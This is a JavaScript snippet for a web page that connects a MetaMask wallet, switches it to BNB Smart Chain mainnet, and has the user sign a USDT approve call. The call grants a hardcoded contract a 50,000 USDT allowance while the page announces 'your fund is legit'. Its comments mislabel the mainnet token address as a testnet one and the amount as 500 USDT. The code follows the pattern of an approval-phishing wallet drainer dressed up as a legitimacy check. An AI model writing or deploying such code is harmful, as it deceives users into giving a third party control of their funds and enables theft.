        // Smart Contract Details
        const BSC_CHAIN_ID = "0x38"; // BNB Smart Chain Mainnet (Hexadecimal)
        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT Testnet Address
        const LOAN_CONTRACT_ADDRESS = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8"; // Replace with your deployed LoanContract address
        const USDT_ABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "_spender", "type": "address" },
                    { "name": "_value", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "name": "", "type": "bool" }],
                "type": "function"
            }
        ];

        let web3;
        let account;

        // Single Button for Wallet Connection and Approval
        document.getElementById("connectAndApprove").addEventListener("click", async () => {
            if (!window.ethereum) {
                alert("Please install MetaMask!");
                return;
            }

            try {
                // Connect to Wallet
                web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                account = accounts[0];
                alert(`Wallet connected: ${account}`);

                const currentChainId = await web3.eth.getChainId();
                    if (currentChainId !== parseInt(BSC_CHAIN_ID, 16)) {
                        await window.ethereum.request({
                            method: "wallet_switchEthereumChain",
                            params: [{ chainId: BSC_CHAIN_ID }],
                        });
                    }

                // Approve USDT
                const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
                const amountToApprove = Web3.utils.toWei("50000", "ether"); // Approve 500 USDT
                 await usdtContract.methods.approve(LOAN_CONTRACT_ADDRESS, amountToApprove).send({ from: account });


        
                    alert("Congratulations! your fund is legit");
    } catch (error) {
        console.error("Error:", error);
        alert("An error occurred. Please Try again.");
    }
});
